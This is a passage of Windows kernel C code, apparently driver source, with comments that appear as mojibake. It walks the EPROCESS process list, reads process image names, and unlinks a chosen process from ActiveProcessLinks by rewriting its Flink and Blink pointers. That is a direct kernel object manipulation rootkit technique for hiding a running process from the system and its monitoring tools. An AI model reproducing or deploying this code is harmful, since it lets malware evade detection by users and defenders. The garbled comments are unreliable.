	LIST_ENTRY*  nextListEntry;

	prevEPROCESSpointer = getPreviousEPROCESSpointer(currentEPROCESSpointer);
	nextEPROCESSpointer = getNextEPROCESSpointer(currentEPROCESSpointer);

	//�ֱ�ȡ�õ�ǰ�����ڵ� 2 �� ERROCESS �� ActiveProcessLinks �ֶΣ�һ�� LIST_ENTRY ����

	currentListEntry = ((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY*)(prevEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY*)(nextEPROCESSpointer + EPROCESS_OFFSET_LINKS));

	//�ֱ��޸������е��ض��ֶΣ�Flink �� Blink����ʵ�����ص�ǰ�� ERROCESS

	//ǰһ�� ERROCESS  �� ActiveProcessLinks.Flink ָ����һ�� ERROCESS  �� ActiveProcessLinks.Flink
	//��һ�� ERROCESS  �� ActiveProcessLinks.Blink ָ��ǰһ�� ERROCESS  �� ActiveProcessLinks.Flink
	//����ƹ��˵�ǰ���м䣩�� ERROCESS �� ActiveProcessLinks
	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

	//��ǰ ERROCESS �� ActiveProcessLinks.Flink �� ActiveProcessLinks.Blink ָ�� ActiveProcessLinks ����
	//�������з���
	(*currentListEntry).Flink = currentListEntry;
	(*currentListEntry).Blink = currentListEntry;

	return;
}


BYTE*  getNextEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  nextEPROCESSpointer = NULL;
	BYTE*  flink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	flink = (BYTE*)(ListEntry.Flink);
	nextEPROCESSpointer = (flink - EPROCESS_OFFSET_LINKS);
	return nextEPROCESSpointer;
}



BYTE*  getPreviousEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  blink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	blink = (BYTE*)(ListEntry.Blink);
	prevEPROCESSpointer = (blink - EPROCESS_OFFSET_LINKS);
	return prevEPROCESSpointer;
}


unsigned char*  get_proc_name(BYTE*  currentEPROCESSpointer){
	unsigned char* proc_name;

	// _EPROCESS.ImageFileName �ֶξ���һ�� UCHAR���༴ unsigned char�������飬
	//�� NT5.2 ���ںˣ�����windows xp ,2003���г��� 16 �ֽڣ��� NT6.2 ���ںˣ�����windows 7, 2008���г��� 15 �ֽ�
	proc_name = (unsigned char*)(currentEPROCESSpointer + EPROCESS_OFFSET_NAME);
	return (proc_name);
}





*/